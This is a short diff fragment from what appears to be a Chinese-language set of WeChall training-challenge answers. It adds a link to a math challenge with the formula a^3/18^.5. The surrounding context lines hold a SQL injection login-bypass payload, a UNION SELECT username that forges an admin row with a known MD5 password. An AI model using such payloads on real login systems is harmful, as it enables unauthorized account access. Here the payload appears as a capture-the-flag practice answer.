@@ -168,4 +168,5 @@
     * username: xxx' union select 1, 'admin' as username, md5('1') as password where username='admin' #
     * password: 1
 
-
+1. [参考链接](http://www.wechall.net/challenge/training/math/pyramid/index.php)
+    * a^3/18^.5
